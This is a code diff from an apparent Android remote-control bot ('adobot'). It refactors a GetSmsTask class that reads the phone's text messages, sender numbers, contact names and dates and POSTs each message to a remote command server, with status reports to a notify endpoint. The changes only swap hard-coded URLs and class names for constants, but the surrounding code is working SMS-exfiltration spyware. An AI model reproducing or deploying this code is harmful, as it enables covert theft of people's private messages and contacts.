@@ -8,7 +8,7 @@ import android.net.Uri;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
-import com.android.adobot.CommandReceiverService;
+import com.android.adobot.CommandService;
 import com.android.adobot.CommonParams;
 
 import org.json.JSONObject;
@@ -17,20 +17,21 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.HashMap;
 
+import com.android.adobot.Constants;
 import com.android.adobot.http.Http;
+import com.android.adobot.http.HttpRequest;
+
 import io.socket.client.Socket;
 
 public class GetSmsTask extends BaseTask {
 
     private static String TAG = "GetSmsTask";
 
-    public static final String POSTURL = "/message";
-
     private CommonParams commonParams;
     private Socket socket;
     private int numsms;
 
-    public GetSmsTask(CommandReceiverService client, int numsms) {
+    public GetSmsTask(CommandService client, int numsms) {
         context = client;
         this.socket = client.getSocket();
         this.numsms = numsms;
@@ -53,8 +54,8 @@ public class GetSmsTask extends BaseTask {
             start.put("uid", commonParams.getUid());
             start.put("device", commonParams.getDevice());
             Http req = new Http();
-            req.setUrl(commonParams.getServer() + "/notify");
-            req.setMethod("POST");
+            req.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            req.setMethod(HttpRequest.METHOD_POST);
             req.setParams(start);
             req.execute();
 
@@ -73,7 +74,7 @@ public class GetSmsTask extends BaseTask {
                         String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
                         String id = mCur.getString(mCur.getColumnIndex("_id"));
                         String phone = mCur.getString(mCur.getColumnIndex("address"));
-                        String name = getContactName(context.getApplicationContext(), phone);
+                        String name = getContactName(phone);
                         String body = mCur.getString(mCur.getColumnIndex("body"));
                         String date = formatter.format(calendar.getTime());
                         String type = mCur.getString(mCur.getColumnIndex("type"));
@@ -92,8 +93,8 @@ public class GetSmsTask extends BaseTask {
                         Log.i(TAG, obj.toString());
 
                         Http smsHttp = new Http();
-                        smsHttp.setMethod("POST");
-                        smsHttp.setUrl(commonParams.getServer() + POSTURL);
+                        smsHttp.setMethod(HttpRequest.METHOD_POST);
+                        smsHttp.setUrl(commonParams.getServer() + Constants.POST_MESSAGE_URL);
                         smsHttp.setParams(p);
                         smsHttp.execute();
 
@@ -112,8 +113,8 @@ public class GetSmsTask extends BaseTask {
                 done.put("uid", commonParams.getUid());
                 done.put("device", commonParams.getDevice());
                 Http doneSMS = new Http();
-                doneSMS.setUrl(commonParams.getServer() + "/notify");
-                doneSMS.setMethod("POST");
+                doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+                doneSMS.setMethod(HttpRequest.METHOD_POST);
                 doneSMS.setParams(done);
                 doneSMS.execute();
 
@@ -124,8 +125,8 @@ public class GetSmsTask extends BaseTask {
             done.put("uid", commonParams.getUid());
             done.put("device", commonParams.getDevice());
             Http doneSMS = new Http();
-            doneSMS.setUrl(commonParams.getServer() + "/notify");
-            doneSMS.setMethod("POST");
+            doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            doneSMS.setMethod(HttpRequest.METHOD_POST);
             doneSMS.setParams(done);
             doneSMS.execute();
 
@@ -138,8 +139,8 @@ public class GetSmsTask extends BaseTask {
             noPermit.put("device", commonParams.getDevice());
             noPermit.put("permission", "READ_SMS");
             Http doneSMS = new Http();
-            doneSMS.setUrl(commonParams.getServer() + "/notify");
-            doneSMS.setMethod("POST");
+            doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            doneSMS.setMethod(HttpRequest.METHOD_POST);
             doneSMS.setParams(noPermit);
             doneSMS.execute();
 
